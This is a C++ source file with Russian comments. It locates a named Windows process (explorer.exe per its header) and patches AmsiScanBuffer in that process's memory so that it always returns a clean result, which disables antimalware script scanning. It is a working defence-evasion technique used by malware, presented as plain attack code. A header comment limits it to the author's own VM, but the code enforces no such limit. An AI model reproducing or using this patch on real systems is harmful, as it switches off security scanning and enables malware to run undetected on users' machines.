// language: C++, file: src/inject.cpp — инъекция в explorer.exe + патч AmsiScanBuffer в памяти, только в пределах своей VM
#include "inject.h"
#include <tlhelp32.h>
#include <string>

typedef HRESULT (WINAPI* AmsiScanBuffer_t)(HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, ULONG*);
typedef HRESULT (WINAPI* AmsiInitialize_t)(LPCWSTR, HANDLE*);

// патч: заставляем AmsiScanBuffer вернуть AMSI_S_CLEAN = 0
static bool PatchAmsiInProcess(HANDLE hProc) {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return false;
    void* fn = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!fn) return false;

    // 1) открыть процесс для записи/создания потока
    HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                           PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
                           FALSE, GetProcessId(hProc));
    if (!h) return false;

    // 2) код-стаб: mov eax, 0; ret  (AMSI_S_CLEAN)
    BYTE stub[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    SIZE_T written = 0;
    // VirtualProtectEx — снять защиту на страницу с AmsiScanBuffer в целевом процессе
    DWORD old = 0;
    if (!VirtualProtectEx(h, fn, sizeof(stub), PAGE_EXECUTE_READWRITE, &old)) {
        CloseHandle(h); return false;
    }
    BOOL ok = WriteProcessMemory(h, fn, stub, sizeof(stub), &written);
    VirtualProtectEx(h, fn, sizeof(stub), old, &old);
    CloseHandle(h);
    return ok && written == sizeof(stub);
}

bool InjectViaAmsi(const wchar_t* targetProc) {
    // найти PID
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, targetProc) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!pid) return false;

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return false;
    bool ok = PatchAmsiInProcess(hProc);
    CloseHandle(hProc);
    return ok;
}
